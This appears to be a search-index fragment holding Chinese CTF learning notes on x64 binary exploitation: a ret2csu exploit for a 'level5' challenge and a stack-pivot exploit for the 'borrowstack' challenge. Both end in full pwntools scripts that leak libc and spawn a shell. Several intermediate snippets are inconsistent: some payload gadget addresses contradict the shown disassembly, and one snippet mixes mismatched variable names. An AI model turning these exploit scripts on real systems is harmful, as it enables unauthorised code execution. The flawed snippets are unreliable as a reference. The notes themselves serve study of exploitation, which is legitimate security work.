\u4f7f\u7528ROPgadget\u5bfb\u627egadgets"},{"location":"Pwn/stackoverflow/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8BLinux%E7%AF%87-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#level-5-gadget","text":"\u56e0\u4e3a\u7a0b\u5e8f\u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u4f1a\u52a0\u5165\u4e00\u4e9b\u901a\u7528\u51fd\u6570\u7528\u6765\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\uff08\u6bd4\u5982\u52a0\u8f7dlibc.so\u7684\u521d\u59cb\u5316\u51fd\u6570\uff09\uff0c\u6240\u4ee5\u867d\u7136\u5f88\u591a\u7a0b\u5e8f\u7684\u6e90\u7801\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u662f\u76f8\u540c\u7684\uff0c\u56e0\u6b64\u9488\u5bf9\u8fd9\u4e9b\u521d\u59cb\u5316\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u63d0\u53d6\u4e00\u4e9b\u901a\u7528\u7684gadgets\u52a0\u4ee5\u4f7f\u7528\uff0c\u4ece\u800c\u8fbe\u5230\u6211\u4eec\u60f3\u8981\u8fbe\u5230\u7684\u6548\u679c\u3002 level 5 \u4ec5\u4ec5\u53ea\u6709\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u70b9 \uff0c\u4e5f\u6ca1\u6709\u4efb\u4f55\u7684\u8f85\u52a9\u51fd\u6570\u53ef\u4ee5\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u5148\u60f3\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\u4fe1\u606f\uff0c\u627e\u5230 system() \u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u4f20\u9012 /bin/sh \u5230 .bss \u6bb5\u3002 \u4e3a\u4ec0\u4e48\u4f20\u9012 /bin/sh \u5230 .bss\u6bb5 \u6700\u540e\u8c03\u7528 system(\u201c/bin/sh\u201d) \u3002\u56e0\u4e3a\u539f\u7a0b\u5e8f\u4f7f\u7528\u4e86 write() \u548c read() \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 write() \u53bb\u8f93\u51fa write.got \u7684\u5730\u5740\uff0c\u4ece\u800c\u8ba1\u7b97\u51fa libc.so \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002\u4f46\u95ee\u9898\u5728\u4e8e write() \u7684\u53c2\u6570\u5e94\u8be5\u5982\u4f55\u4f20\u9012\u3002\u6211\u4eec\u4f7f\u7528 ROPgadget \u5e76\u6ca1\u6709\u627e\u5230\u7c7b\u4f3c\u4e8e pop rdi, ret,pop rsi, ret \u8fd9\u6837\u7684 gadgets \u3002\u90a3\u5e94\u8be5\u600e\u4e48\u529e\u5462\uff1f\u5176\u5b9e\u5728 x64 \u4e0b\u6709\u4e00\u4e9b\u4e07\u80fd\u7684 gadgets \u53ef\u4ee5\u5229\u7528\u3002 \u84b8\u7c73\u5e08\u5085\u63d0\u4f9b\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u548c\u4e0b\u9762\u6709\u70b9\u533a\u522b\uff0c\u4e0b\u9762\u662f\u7528\u76f8\u540c\u6e90\u7801\u5728ubuntu 16.04 \u4e0b\u7f16\u8bd1\uff0c\u7f16\u8bd1\u6307\u4ee4\uff1agcc -fno-stack-protector -o level5 level5.c \u4f7f\u7528\u547d\u4ee4 objdump -d level5 \u627e\u5230\u8c03\u7528libc.so\u7684\u521d\u59cb\u5316\u51fd\u6570 __libc_csu_init() \u3002\u6c47\u7f16\u4ee3\u7801\u5982\u4e0b\uff1a 00000000004005c0 <__libc_csu_init>: 4005c0: 41 57 push %r15 4005c2: 41 56 push %r14 4005c4: 41 89 ff mov %edi,%r15d 4005c7: 41 55 push %r13 4005c9: 41 54 push %r12 4005cb: 4c 8d 25 3e 08 20 00 lea 0x20083e(%rip),%r12 # 600e10 <__frame_dummy_init_array_entry> 4005d2: 55 push %rbp 4005d3: 48 8d 2d 3e 08 20 00 lea 0x20083e(%rip),%rbp # 600e18 <__init_array_end> 4005da: 53 push %rbx 4005db: 49 89 f6 mov %rsi,%r14 4005de: 49 89 d5 mov %rdx,%r13 4005e1: 4c 29 e5 sub %r12,%rbp 4005e4: 48 83 ec 08 sub $0x8,%rsp 4005e8: 48 c1 fd 03 sar $0x3,%rbp 4005ec: e8 0f fe ff ff callq 400400 <_init> 4005f1: 48 85 ed test %rbp,%rbp 4005f4: 74 20 je 400616 <__libc_csu_init+0x56> 4005f6: 31 db xor %ebx,%ebx 4005f8: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 4005ff: 00 400600: 4c 89 ea mov %r13,%rdx 400603: 4c 89 f6 mov %r14,%rsi 400606: 44 89 ff mov %r15d,%edi 400609: 41 ff 14 dc callq *(%r12,%rbx,8) 40060d: 48 83 c3 01 add $0x1,%rbx 400611: 48 39 eb cmp %rbp,%rbx 400614: 75 ea jne 400600 <__libc_csu_init+0x40> 400616: 48 83 c4 08 add $0x8,%rsp 40061a: 5b pop %rbx 40061b: 5d pop %rbp 40061c: 41 5c pop %r12 40061e: 41 5d pop %r13 400620: 41 5e pop %r14 400622: 41 5f pop %r15 400624: c3 retq 400625: 90 nop 400626: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 40062d: 00 00 00 \u5229\u7528\u5176\u4e2d 0x40061a \u5f00\u59cb\u76846\u884c\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u5bc4\u5b58\u5668 rbx,rbp,r12,r13,r14,r15 \u7684\u503c\u3002\u968f\u540e\u53ef\u4ee5\u5229\u7528 0x400600 \u5f00\u59cb\u76846\u884c\u4ee3\u7801\uff0c\u5c06 r15 \u7684\u503c\u8d4b\u503c\u7ed9 rdx \uff0c r14 \u7684\u503c\u8d4b\u503c\u7ed9 rsi \uff0c r13 \u7684\u503c\u8d4b\u503c\u7ed9 edi \u3002\u968f\u540e\u5c31\u4f1a\u8c03\u7528call qword ptr [r12+rbx*8]\u3002\u53ea\u8981\u6211\u4eec\u63a7\u5236rbx\u7684\u503c\u4e3a 0 \uff0c\u7cbe\u5fc3\u6784\u9020\u6808\u4e0a\u4f20\u5165\u4e0a\u8ff0\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236 pc \uff0c\u8c03\u7528\u6211\u4eec\u60f3\u8981\u7684\u51fd\u6570\u3002 \u4e3a\u4ec0\u4e48\u9700\u8981\u63a7\u5236 rbx \u7684\u503c\u4e3a0\uff1f \u6267\u884c\u5b8c call qword ptr [r12+rbx*8] \u4e4b\u540e\uff0c\u7a0b\u5e8f\u4f1a\u5bf9rbx+=1\uff0c\u7136\u540e\u5bf9\u6bd4 rbp \u548c rbx \u7684\u503c\uff0c\u5982\u679c\u76f8\u7b49\u5c31\u4f1a\u7ee7\u7eed\u5411\u4e0b\u6267\u884c\u5e76 ret \u5230\u6211\u4eec\u60f3\u8981\u7ee7\u7eed\u6267\u884c\u7684\u5730\u5740\u3002\u6240\u4ee5\u4e3a\u4e86\u8ba9 rbp \u548c rbx \u7684\u503c\u76f8\u7b49\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 rbp \u7684\u503c\u8bbe\u7f6e\u4e3a1\uff0c\u56e0\u4e3a\u4e4b\u524d\u5df2\u7ecf\u5c06 rbx \u7684\u503c\u8bbe\u7f6e\u4e3a0\u4e86\u3002 \u6211\u4eec\u5148\u6784\u9020 payload1 \uff0c\u5229\u7528 write() \u8f93\u51fa write \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u3002\u6ce8\u610f\u6211\u4eec\u7684 gadget \u662f call qword ptr [r12+rbx*8] \uff0c\u6240\u4ee5\u6211\u4eec\u5e94\u8be5\u4f7f\u7528 write.got \u7684\u5730\u5740\u800c\u4e0d\u662f write.plt \u7684\u5730\u5740\u3002\u5e76\u4e14\u4e3a\u4e86\u8fd4\u56de\u5230\u539f\u7a0b\u5e8f\u4e2d\uff0c\u91cd\u590d\u5229\u7528buffer overflow\u7684\u6f0f\u6d1e\uff0c\u6211\u4eec\u9700\u8981\u7ee7\u7eed\u8986\u76d6\u6808\u4e0a\u7684\u6570\u636e\uff0c\u76f4\u5230\u628a\u8fd4\u56de\u503c\u8986\u76d6\u6210\u76ee\u6807\u51fd\u6570\u7684main\u51fd\u6570\u4e3a\u6b62\u3002 \u4e3a\u4ec0\u4e48\u4f7f\u7528\u7684\u662f write.got \u800c\u4e0d\u662f write.plt\uff1f write.plt \u76f8\u5f53\u4e8e call write\u3002\u6267\u884c\u4e86\u4e24\u4e2a\u52a8\u4f5c\uff0c\u5c06\u6307\u9488\u8df3\u8f6c\u5230 write \u771f\u5b9e\u5730\u5740\uff1b\u5c06\u8fd4\u56de\u5730\u5740\u538b\u6808\u3002 write.got \u4ec5\u5c06\u6307\u9488\u8df3\u8f6c\u5230 write \u771f\u5b9e\u5730\u5740\u3002 payload1 \u6784\u9020\u5982\u4e0b\uff1a #rdi= edi = r13, rsi = r14, rdx = r15 #write(rdi=1, rsi=write.got, rdx=4) payload1 = \" \\x00 \" * 136 payload1 += p64 ( 0x400606 ) + p64 ( 0xdeadbeef ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( got_write ) + p64 ( 1 ) + p64 ( got_write ) + p64 ( 8 ) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret payload1 += p64 ( 0x4005F0 ) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] payload1 += \" \\x00 \" * 56 payload1 += p64 ( main ) \u5f53\u6211\u4eec exp \u5728\u6536\u5230 write() \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u540e\uff0c\u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa system() \u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u4e86\u3002\u63a5\u7740\u6211\u4eec\u6784\u9020 payload2 \uff0c\u5229\u7528 read() \u5c06 system() \u7684\u5730\u5740\u4ee5\u53ca /bin/sh \u8bfb\u5165\u5230 .bss \u6bb5\u5185\u5b58\u4e2d\u3002 payload2 \u6784\u9020\u5982\u4e0b\uff1a #rdi= edi = r13, rsi = r14, rdx = r15 #read(rdi=0, rsi=bss_addr, rdx=16) payload2 = \" \\x00 \" * 136 payload2 += p64 ( 0x400606 ) + p64 ( 0xdeadbeef ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( got_read ) + p64 ( 0 ) + p64 ( bss_addr ) + p64 ( 16 ) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret payload2 += p64 ( 0x4005F0 ) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] payload2 += \" \\x00 \" * 56 payload2 += p64 ( main ) \u6700\u540e\u6211\u4eec\u6784\u9020 payload3 ,\u8c03\u7528 system() \u51fd\u6570\u6267\u884c /bin/sh \u3002\u6ce8\u610f\uff0c system() \u7684\u5730\u5740\u4fdd\u5b58\u5728\u4e86 .bss \u6bb5\u9996\u5730\u5740\u4e0a\uff0c /bin/sh \u7684\u5730\u5740\u4fdd\u5b58\u5728\u4e86 .bss \u6bb5\u9996\u5730\u5740+8\u5b57\u8282\u4e0a\u3002 #rdi= edi = r13, rsi = r14, rdx = r15 #system(rdi = bss_addr+8 = \"/bin/sh\") payload3 = \" \\x00 \" * 136 payload3 += p64 ( 0x400606 ) + p64 ( 0xdeadbeef ) + p64 ( 0 ) + p64 ( 1 ) + p64 ( bss_addr ) + p64 ( bss_addr + 8 ) + p64 ( 0 ) + p64 ( 0 ) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret payload3 += p64 ( 0x4005F0 ) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8] payload3 += \" \\x00 \" * 56 payload3 += p64 ( main ) \u4ee5\u4e0a\u662f\u84b8\u7c73\u6587\u7ae0\u9605\u8bfb\u540e\u7684\u7406\u89e3\u7b14\u8bb0 \u6700\u7ec8exp\u5982\u4e0b\uff1a from pwn import * p = process ( './level5' ) #p = remote('192.168.17.155',10001) elf = ELF ( 'level5' ) libc = elf . libc main = elf . symbols [ 'main' ] bss_addr = elf . bss () gadget1 = 0x40061a gadget2 = 0x400600 got_write = elf . got [ 'write' ] print \"[*]write() got: \" + hex ( got_write ) got_read = elf . got [ 'read' ] print \"[*]read() got: \" + hex ( got_read ) def csu ( rbx , rbp , r12 , r13 , r14 , r15 , ret ): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = \"A\" * 136 payload += p64 ( gadget1 ) + p64 ( rbx ) + p64 ( rbp ) + p64 ( r12 ) + p64 ( r13 ) + p64 ( r14 ) + p64 ( r15 ) payload += p64 ( gadget2 ) payload += \"B\" * 56 payload += p64 ( ret ) return payload #write(rdi=1, rsi=write.got, rdx=4) payload1 = csu ( 0 , 1 , got_write , 8 , got_write , 1 , main ) p . recvuntil ( \"Hello, World \\n \" ) print \" \\n #############sending payload1############# \\n \" p . send ( payload1 ) sleep ( 1 ) write_addr = u64 ( p . recv ( 8 )) print \"[*]leak write() addr: \" + hex ( write_addr ) libc . address = write_addr - libc . symbols [ 'write' ] execve_addr = libc . symbols [ \"execve\" ] print \"[*]execve() addr: \" + hex ( execve_addr ) p . recvuntil ( \"Hello, World \\n \" ) #read(rdi=0, rsi=bss_addr, rdx=16) payload2 = csu ( 0 , 1 , got_read , 16 , bss_addr , 0 , main ) print \" \\n #############sending payload2############# \\n \" p . send ( payload2 ) sleep ( 1 ) p . send ( p64 ( execve_addr )) p . send ( \"/bin/sh \\0 \" ) sleep ( 1 ) p . recvuntil ( \"Hello, World \\n \" ) #execve(rdi = bss_addr+8 = \"/bin/sh\", rsi=0, rdx=0) payload3 = csu ( 0 , 1 , bss_addr , 0 , 0 , bss_addr + 8 , main ) print \" \\n #############sending payload3############# \\n \" sleep ( 1 ) p . send ( payload3 ) p . interactive ()","title":"level 5 - \u901a\u7528gadget"},{"location":"Pwn/stackoverflow/%E6%A0%88%E8%BF%81%E7%A7%BB/%E6%A0%88%E8%BF%81%E7%A7%BB/","text":"\u6808\u8fc1\u79fb\uff08\u65b0\uff09 \u00b6 \u524d\u9762\u521a\u603b\u7ed3\u5b8c\u7684\u7b14\u8bb0\u611f\u89c9\u4e0d\u592a\u5b8c\u5584\uff0c\u7136\u540e\u518d\u505a\u4e86\u9898\u540e\uff0c\u7406\u89e3\u66f4\u52a0\u900f\u5f7b\uff0c\u91cd\u65b0\u6574\u7406\u4e00\u4e0b\u3002 \u4ecb\u7ecd \u00b6 \u5f53\u5b58\u5728\u6808\u6ea2\u51fa\u4e14\u53ef\u6ea2\u51fa\u957f\u5ea6\u4e0d\u8db3\u4ee5\u5bb9\u7eb3 payload \u65f6\uff0c\u53ef\u91c7\u7528\u6808\u8fc1\u79fb\u3002\u4e00\u822c\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6ea2\u51fa\u4ec5\u80fd\u8986\u76d6 ebp \u3001 eip \u3002\u56e0\u4e3a\u539f\u6765\u7684\u6808\u7a7a\u95f4\u4e0d\u8db3\uff0c\u6240\u4ee5\u8981\u6784\u5efa\u4e00\u4e2a\u65b0\u7684\u6808\u7a7a\u95f4\u653e\u4e0b payload \uff0c\u56e0\u6b64\u79f0\u4e3a\u6808\u8fc1\u79fb\u3002 \u5927\u6982\u539f\u7406 \u00b6 \u9996\u5148\u6808\u6267\u884c\u547d\u4ee4\u662f\u4ece esp \u5f00\u59cb\u5411 ebp \u65b9\u5411\u9010\u6761\u6267\u884c\uff0c\u4e5f\u5c31\u662f\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u9010\u6761\u6267\u884c\u3002\u89e6\u53d1\u6808\u8fc1\u79fb\u7684\u5173\u952e\u6307\u4ee4\uff1a leave|ret \uff0c\u7b49\u6548\u4e8e mov esp ebp; pop ebp; ret; \uff0c\u4f5c\u7528\u662f\u5c06 ebp \u8d4b\u503c\u7ed9 esp \uff0c\u5e76\u5f39\u51fa ebp \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\u9000\u51fa\u6808\u65f6\uff0cesp \u6307\u5411 ebp \u6240\u5728\u4f4d\u7f6e\uff0cebp \u6307\u5411 ebp \u6240\u5b58\u50a8\u7684\u4f4d\u7f6e\u3002\u7b49\u540c\u4e8e\u6267\u884c\u4e00\u4e2a leave ret \u7684\u6548\u679c\u3002 \u6808\u8fc1\u79fb\uff1a\u901a\u8fc7\u76f4\u63a5\u63a7\u5236 ebp \u7684\u503c\uff0c\u501f\u52a9 leave \u6307\u4ee4\uff0c\u95f4\u63a5\u63a7\u5236 esp \u7684\u503c\u3002\u4ece\u4e0a\u56fe\u53ef\u89c1\uff0c\u6b63\u5e38\u9000\u51fa esp \u4f1a\u6307\u5411\u539f ebp \u4f4d\u7f6e\u3002\u5982\u679c\u6211\u4eec\u8986\u76d6 eip \u518d\u6b21\u6267\u884c leave \u6307\u4ee4\uff0cesp \u5c06\u4f1a\u6307\u5411 0x400a0 \u7684\u4f4d\u7f6e\uff08ebp \u5c06\u6307\u5411\u5f53\u524d ebp \u5b58\u50a8\u7684\u5730\u5740\uff09\uff0c\u4e5f\u5c31\u662f\u5c06\u6808\u8fc1\u79fb\u5230 0x400a0 \u3002\u901a\u8fc7\u63d0\u524d\u5e03\u7f6e ebp \u4e2d\u7684\u5730\u5740\u548c\u8c03\u7528 leave \u6307\u4ee4\uff0c\u53ef\u5b8c\u6210\u8fde\u7eed\u591a\u6b21\u6808\u8fc1\u79fb\u3002 \u5728\u4e0a\u56fe\u4e2d\u4e5f\u53ef\u4ee5\u770b\u51fa\uff0c\u6808\u8fc1\u79fb\u7684\u5730\u5740\u4fe1\u606f\u88ab\u63d0\u524d\u5199\u5165\uff0c\u6240\u4ee5\u660e\u786e\u5e76\u63d0\u524d\u8ba1\u7b97\u6808\u88ab\u8fc1\u79fb\u5230\u7684\u5185\u5b58\u5730\u5740\uff0c\u662f\u6808\u8fc1\u79fb\u7684\u5173\u952e\u3002\u5f53\u7136\u4e5f\u662f\u6709\u9a9a\u64cd\u4f5c\uff0c\u53ef\u4e0d\u63d0\u524d\u5199\u5165\u7684\uff0c\u8be6\u60c5\u770b\u4e0b\u9762\u9898\u76ee\u5206\u6790\u3002 \u5728\u6211\u770b\u6765\uff0c\u6808\u8fc1\u79fb\u4e0d\u80fd\u7b97\u662f\u5728\u5185\u5b58\u5730\u5740\u4e2d\u521b\u5efa\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u6808\u7ed3\u6784\uff0c\u800c\u662f\u590d\u523b\u4e86\u6808\u4ece\u9ad8\u5730\u5740\u5230\u4f4e\u5730\u5740\u4f9d\u6b21\u6267\u884c\u547d\u4ee4\u7684\u529f\u80fd\u3002\u56e0\u4e3a\u4e00\u822c\u60c5\u51b5\u4e0b\u591a\u6b21\u6808\u8fc1\u79fb\uff0cebp \u5730\u5740\u4e0e esp \u5730\u5740\u5173\u7cfb\u6bd4\u8f83\u5947\u602a\uff0cebp \u5730\u5740\u4f1a\u6bd4 esp \u4f4e\uff0c\u7279\u522b\u662f\u6700\u540e\u4e00\u6b21\u6808\u8fc1\u79fb\uff0cebp \u7684\u503c\u4e0d\u518d\u91cd\u8981\uff0c\u53ef\u88ab\u6307\u5411\u5230\u5947\u5947\u602a\u602a\u7684\u5730\u5740\uff0c\u8fd9\u4e0d\u76f8\u5f53\u4e8e\u6ca1\u6709 ebp \u7684\u6808\u4e48\u3002 \u9898\u76ee \u00b6 \u9898\u76ee\u6765\u81ea i\u6625\u79cb\u65b0\u6625\u6218\u5f79 borrowstack \u9898\u76ee\u4ecb\u7ecd \u00b6 \u53ea\u6253\u5f00 NX \u4fdd\u62a4\u768464 \u4f4d\u7a0b\u5e8f\u3002\u7a0b\u5e8f\u5185\u5bb9\u4e3a\uff1a\u63d0\u793a\u8f93\u5165\u4e24\u6b21\u3002 ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/l, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 3d3f6ef2905eff37d82ebb1bfa6e7c4e75384eff, not stripped Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) \u6f0f\u6d1e \u00b6 \u7b2c\u4e00\u5904\u63d0\u793a\u8f93\u5165\u5b58\u5728\u6ea2\u51fa\uff0c\u53ef\u6ea2\u51fa 0x10 \uff0c\u4ec5\u53ef\u4ee5\u8986\u76d6 ebp\u3001eip \u3002\u7b2c\u4e8c\u5904\u8f93\u5165\u5141\u8bb8\u5411 bank \u5199\u5165 0x100 \u5b57\u8282\uff0cbank \u4f4d\u4e8e bss \u6bb5\u5934\u3002 int __cdecl main ( int argc , const char ** argv , const char ** envp ) { char buf ; // [rsp+0h] [rbp-60h] setbuf ( stdin , 0L L ); setbuf ( stdout , 0L L ); puts ( & s ); read ( 0 , & buf , 0x70uLL ); //\u53ef\u6ea2\u51fa0x10\u5b57\u8282 puts ( \"Done!You can check and use your borrow stack now!\" ); read ( 0 , & bank , 0x100uLL ); return 0 ; } \u8fd9\u6761\u9898\u76ee\u76ee\u7684\u5c31\u662f\u5f15\u5bfc\u6211\u4eec\u5c06\u6808\u8fc1\u79fb\u5230 bss \u6bb5\uff0c\u5e76\u4e14\u4e3a\u6211\u4eec\u9884\u7559\u4e86\u5199\u5165 bss \u6bb5\u7684\u51fd\u6570\u3002 \u8fd9\u91cc\u63d2\u4e00\u5634\uff0c\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u9884\u7559\u51fd\u6570\uff0c\u4f46\u662f\u53ef\u4ee5\u6ea2\u51fa\u66f4\u957f\u53c8\u4e0d\u8db3\u591f\u653e\u4e0b payload\uff08\u5982\uff1a0x30\uff09\u600e\u4e48\u89e3\u51b3\uff1f\u63a7\u5236 eip \u6784\u5efa\u4e00\u4e2a\u5199\u5165\u51fd\u6570\uff0c\u7136\u540e\u624d\u518d\u8c03\u7528\u6307\u4ee4 leave \u3002\uff08\u8be5\u5957\u8def\u9898\u76ee\uff1a HITCON-Training-master lab6 \uff09 \u5229\u7528 \u00b6 \u6700\u6700\u6700\u666e\u901a\u7684\uff0c\u6ca1\u6709\u9a9a\u64cd\u4f5c\u7684\u6808\u8fc1\u79fb\u9898\u76ee\uff08\u4e5f\u5c31\u662f\u672c\u9898\uff09\uff0c\u4f1a\u8fdb\u884c\u4e24\u6b21\u6808\u8fc1\u79fb\u3002\u7b2c\u4e00\u6b21\u8fc1\u79fb\u6cc4\u9732 libc \u57fa\u5730\u5740\uff0c\u5e76\u4e14\u4e3a\u7b2c\u4e8c\u6b21\u6267\u884c one_gadget \u4e4b\u7c7b get shell\u3002 \u5927\u6982\u653b\u51fb\u6d41\u7a0b \u6808\u6ea2\u51fa\u63a7\u5236 ebp \u4e3a\u7b2c\u4e00\u6b21\u6808\u8fc1\u79fb\u505a\u51c6\u5907\uff0c\u63a7\u5236 eip \u518d\u6b21\u6267\u884c leave \u6307\u4ee4\u3002 \u5199\u5165\u7b2c\u4e00\u6b21\u8fc1\u79fb\u7684\u6808\u6570\u636e\uff0c\u529f\u80fd\u9700\u8981\u6709\uff1a\u6cc4\u9732 libc \u57fa\u5730\u5740\uff0c\u4e3a\u7b2c\u4e8c\u6b21\u8fc1\u79fb\u505a\u51c6\u5907\u3002 \u7b2c\u4e8c\u6b21\u8fc1\u79fb\u7684\u6808\u6267\u884c one_gadget \u3002 \u6808\u6ea2\u51fa\u7684\u8bdd\u95ee\u9898\u4e0d\u5927\uff0c\u5728\u7b2c\u4e00\u6b21 read \u5199\u5165 0x60 \u5c31\u5230 ebp \uff0c\u7136\u540e\u6309\u9700\u8986\u76d6\u5c31\u53ef\u4ee5\u3002\u6bd4\u5982\u8bf4\u6211\u51b3\u5b9a\u5c06\u7b2c\u4e00\u6b21\u6808\u8fc1\u79fb\u5230 bank+0x90 \uff0c\u90a3\u4e48 ebp \u5c31\u8986\u76d6\u4e3a bank+0x90 \u3002\u8c03\u51c6\u5730\u5740\u660e\u786e\u4e86\uff0c\u4e0b\u4e00\u6b65\u5c31\u9700\u8981\u89e6\u53d1\u6808\u8fc1\u79fb\u4e86\uff0c\u4e5f\u5c31\u662f\u5728\u6267\u884c\u4e00\u6b21 leave \u6307\u4ee4\uff0c\u901a\u8fc7\u8986\u5199 eip \u4e3a leave \u3002(bank\u5730\u5740\u4e3a0x601080 \uff0c leave\u5730\u5740\u4e3a0x400699) payload_0 = 'a' * 0x60 payload_0 += bank + 0x90 payload_0 += leave \u7b2c\u4e00\u6b21\u6808\u8fc1\u79fb\u5916\u90e8\u51c6\u5907\u5b8c\u6210\uff0c\u5c31\u9700\u8981\u5411 bank+0x90 \u5199\u5165\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\u3002\u8fd9\u9053\u9898\u662f\u5229\u7528\u7684\u662f\u7b2c\u4e8c\u6b21 read \u8f93\u5165 stack 1 \u6570\u636e\u3002\u524d\u9762\u8bf4\u8fc7\uff0c\u9700\u8981\u8fdb\u884c\u4e24\u6b21\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8f93\u5165 stack 1 \u6570\u636e\u8981\u8003\u8651\u7b2c\u4e8c\u6b21\u6808\u8fc1\u79fb\u7684\u5730\u5740\uff0c\u6211\u9009\u62e9 bank+0x60 \u3002 \u5728 stack 1 \u9700\u8981\u6cc4\u9732\u51fa libc \u57fa\u5730\u5740\uff0c\u5199\u5165stack 2 \u6570\u636e\u3002\u6cc4\u9732\u5730\u5740\u5c31\u9009\u62e9\u4e00\u4e2a\u51fd\u6570\u771f\u5b9e\u5730\u5740\u8f93\u51fa\u5e76\u8ba1\u7b97\u504f\u79fb\uff0c\u7136\u540e\u8c03\u7528 main \u51fd\u6570\u4e2d\u7684 read2 \u5199\u5165 stack 2 \uff0c\u56e0\u4e3a\u987a\u5e8f\u6267\u884c\uff0c\u56e0\u6b64\u8fd8\u6267\u884c\u4e86\u4e00\u6b21 leave \uff08\u5373 main \u51fd\u6570\u4ece read2 \u5f00\u59cb\u8fd0\u884c\u4e00\u904d\uff09\uff0c\u89e6\u53d1\u7b2c\u4e8c\u6b21\u6808\u8fc1\u79fb\u3002 payload_1 = ' \\0 ' * 0x90 #\u586b\u5145\u5230bank+0x90 payload_1 += p64 ( bank + 0x60 ) #stack2\u5730\u5740 payload_1 += p64 ( pop_rdi ) #\u4f20\u53c2 payload_1 += p64 ( puts_got ) #\u6cc4\u9732\u51fd\u6570 payload_1 += p64 ( puts_plt ) payload_1 += p64 ( 0x400680 ) #main\u4e2d\u7684read2&leave stack 1 \u51c6\u5907\u5b8c\u6210\uff0c\u5e76\u4e14\u4e3a stack 2 \u9884\u7559\u5199\u5165\u51fd\u6570\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5904\u7406\u5e76\u5199\u5165 stack 2 \u3002\u56e0\u4e3a\u8fd9\u4e2a\u6808\u5df2\u7ecf\u662f\u6700\u540e\u4e00\u4e2a\u6808\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u5173\u5fc3 ebp \u7684\u503c\uff0c\u6211\u7ed9\u5b83\u8d4b\u503c 0xdeadbeef \u3002 \u5982\u679c\u9047\u5230\u6709\u7684\u9898\u76ee\u9700\u89813 \u6b21\u3001 4 \u6b21\u7b49\u591a\u6b21\u8fc1\u79fb\uff0c\u5c31\u5c06 ebp \u8d4b\u503c\u4e3a\u4e0b\u4e00\u6b21\u8fc1\u79fb\u7684\u5730\u5740\uff0c\u76f4\u5230\u6700\u540e\u4e00\u6b21\u3002 libc_base = u64 ( p . recv ( 6 )[:] . ljust ( 8 , ' \\0 ' )) - libc . symbols [ 'puts' ] #\u6cc4\u9732libc\u57fa\u5730\u5740 payload = 'a' * 0x60 #\u586b\u5145\u5230bank+0x60 payload_2 += p64 ( 0xdeadbeef ) #ebp\u503c payload += p64 ( one_gadget + libc_base ) #one_gadget p . sendline ( pay ) p . interactive () \u586b\u5145\u8df3\u8f6c\u793a\u610f\u56fe\uff1a \u5b8c\u6574 exp from pwn import * context . log_level = 'debug' p = process ( \"./borrowstack\" ) elf = ELF ( \"./borrowstack\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) bank = 0x601080 pop_rdi = 0x400703 leave = 0x400699 puts_plt = elf . plt [ 'puts' ] puts_got = elf . got [ 'puts' ] one_gadget = 0xf02a4 payload_0 = 'a' * 0x60 payload_0 += p64 ( bank + 0x90 ) + p64 ( leave ) p . recvuntil ( 'want' ) p . send ( payload_0 ) payload_1 = ' \\0 ' * 0x90 + p64 ( bank + 0x60 ) + p64 ( pop_rdi ) + p64 ( puts_got ) + p64 ( puts_plt ) payload_1 += p64 ( 0x0400680 ) p . sendafter ( 'now! \\n ' , payload_1 ) libc_base = u64 ( p . recv ( 6 )[:] . ljust ( 8 , ' \\0 ' )) - libc . symbols [ 'puts' ] info ( \"one:\" + hex ( libc_base + one_gadget )) payload_2 = 'a' * 0x60 + p64 ( 0xdeadbeef ) + p64 ( one_gadget + libc_base ) p . sendline ( payload_2 ) p . interactive () 